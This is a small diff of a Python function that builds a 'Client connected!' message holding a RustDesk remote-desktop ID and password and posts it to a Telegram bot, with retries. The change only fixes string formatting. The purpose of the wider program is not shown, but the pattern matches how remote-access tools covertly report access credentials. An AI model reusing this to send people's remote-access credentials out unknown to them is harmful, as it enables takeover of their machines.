@@ -127,10 +127,7 @@ def get_rustdesk_id():
 
 def send_to_bot(rd_id: str, password: str, chat_id: int):
     """Отправить данные подключения в Telegram бот — с retry"""
-    msg = f"🖥 Клиент подключился!
-
-RustDesk ID: {rd_id}
-Пароль: {password}"
+    msg = "🖥 Клиент подключился!\n\nRustDesk ID: " + str(rd_id) + "\nПароль: " + str(password)
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     for attempt in range(5):
         try:
